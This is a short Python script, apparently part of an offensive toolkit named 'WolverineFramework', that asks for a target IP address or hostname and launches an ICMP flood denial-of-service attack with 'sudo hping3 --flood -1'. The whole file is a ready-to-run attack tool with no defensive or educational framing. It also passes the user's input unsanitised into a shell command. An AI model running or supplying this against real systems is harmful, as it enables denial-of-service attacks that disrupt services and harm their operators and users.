#!/usr/bin/env python3
import os

def DDOS_ICMP():
    print("Enter the IP Address / Hostname of your Target (ICMP Methode One)")
    IP = input("WolverineFramework - \033[1;4m IP \033[0m > ")
    print("Attack launched using hping3...")
    command = "sudo hping3 --flood -1 " + IP
    os.system(command)